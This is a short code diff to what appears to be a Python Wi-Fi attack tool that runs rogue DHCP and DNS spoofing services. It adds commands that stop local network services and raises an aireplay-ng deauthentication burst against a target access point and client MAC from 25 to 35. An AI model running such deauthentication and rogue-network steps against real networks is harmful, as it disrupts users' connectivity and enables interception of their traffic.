@@ -50,6 +50,18 @@ Base.kill_process_by_name('apple_rogue_dhcp')
 Base.kill_process_by_name('dhcp_rogue_server')
 Base.kill_process_by_name('dnschef')
 
+try:
+    Base.print_info("Stop services ...")
+    sub.Popen(['service dnsmasq stop  >/dev/null 2>&1'], shell=True)
+    sub.Popen(['service network-manager stop  >/dev/null 2>&1'], shell=True)
+except OSError as e:
+    if e.errno == errno.ENOENT:
+        Base.print_error("Program: ", "service", " is not installed!")
+        exit(1)
+    else:
+        Base.print_error("Something went wrong while trying to run ", "`service ...`")
+        exit(2)
+
 # Kill the processes that listens on 53 UDP port, 80 and 443 TCP ports
 Base.kill_process_by_listen_port(53, 'udp')
 Base.kill_process_by_listen_port(68, 'udp')
@@ -457,7 +469,7 @@ if __name__ == "__main__":
                 
                 sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel + ' >/dev/null 2>&1'],
                           shell=True, stdout=sub.PIPE)
-                aireplay_process = sub.Popen(['aireplay-ng wlan1 -0 25 -a ' + bssid + ' -c ' + target_mac_address +
+                aireplay_process = sub.Popen(['aireplay-ng wlan1 -0 35 -a ' + bssid + ' -c ' + target_mac_address +
                                               ' >/dev/null 2>&1'], shell=True)
                 aireplay_process.wait()
 
